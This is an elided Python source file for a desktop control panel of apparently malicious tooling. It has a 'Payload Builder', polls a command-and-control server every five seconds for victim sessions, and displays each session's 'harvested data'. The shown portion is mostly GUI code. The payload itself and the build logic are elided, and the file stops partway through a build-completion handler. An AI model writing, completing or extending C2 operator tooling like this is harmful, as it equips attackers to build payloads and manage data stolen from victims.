...
# --- CONFIGURATION ---
# The default URL for the C2 server this GUI will talk to.
...
class App(ctk.CTk):
    def __init__(self):
        ...
        # --- DATA STORAGE ---
        self.sessions = {} # Cache for session data
        self.session_widgets = {} # Map session_id to its button
        
        # --- WIDGETS ---
        # Left frame for sessions list and builder
        ...
        # Right frame for displaying harvested data
    ...
    def setup_left_frame(self):
        """Creates all widgets within the left-side frame."""
        # Builder Section
        ...
        builder_frame.grid_columnconfigure(0, weight=1)
        
        ctk.CTkLabel(builder_frame, text="Payload Builder", font=ctk.CTkFont(weight="bold")).grid(row=0, column=0, columnspan=2, pady=(0, 5))
        self.payload_name_entry = ctk.CTkEntry(builder_frame, placeholder_text="payload_name")
        self.payload_name_entry.grid(row=1, column=0, columnspan=2, sticky="ew", pady=5)
        
        self.debug_mode_var = ctk.BooleanVar()
        ctk.CTkCheckBox(builder_frame, text="Debug Mode (Show Console)", variable=self.debug_mode_var).grid(row=2, column=0, columnspan=2, sticky="w", pady=5)
        
        self.build_button = ctk.CTkButton(builder_frame, text="Build Payload", command=self.build_payload_handler)
        self.build_button.grid(row=3, column=0, columnspan=2, sticky="ew", pady=(5, 10))
        ...
        self.sessions_frame.grid(row=3, column=0, sticky="nsew", padx=10)

    def setup_right_frame(self):
        """Creates all widgets within the right-side data display frame."""
        ...
        self.data_textbox = ctk.CTkTextbox(self.right_frame, wrap="word", corner_radius=0)
        self.data_textbox.grid(row=1, column=0, sticky="nsew", padx=10, pady=(0, 10))
        self.data_textbox.insert("0.0", "Harvested data will be displayed here...")
        self.data_textbox.configure(state="disabled")

    def start_polling(self):
        """Starts the background thread to poll for sessions."""
    ...
    def poll_for_sessions(self):
        """The function that runs in a loop to get session data from the C2 server."""
        while self.polling_active:
            try:
                ...
                # Handle connection errors silently in the background
                pass
            time.sleep(5) # Poll every 5 seconds

    def update_gui_with_sessions(self, server_sessions):
        """Updates the session list in the GUI. Must be called from the main thread."""
    ...
    def add_session_widget(self, session_data):
        """Creates a button for a new session in the list."""
        sid = session_data["session_id"]
    ...
    def display_session_data(self, session_id):
        """Shows the data for a selected session in the textbox."""
        ...
        data_content = session.get("data", "No data available for this session.")
        self.data_textbox.configure(state="normal")
        self.data_textbox.delete("0.0", "end")
        self.data_textbox.insert("0.0", data_content)
        self.data_textbox.configure(state="disabled")

    def build_payload_handler(self):
        """Handles the 'Build Payload' button click event."""
        ...
        # Run build in a separate thread to not freeze the GUI
    ...
    def _run_build(self, c2_url, output_dir, payload_name):
        """Wrapper to run the build process and handle GUI updates back on the main thread."""
        ...
        # Schedule the follow-up actions on the main GUI thread
        self.after(0, self.on_build_complete, success, payload_name)

    def on_build_complete(self, success, payload_name):
        """Actions to perform after the build process is finished."""
        if success:
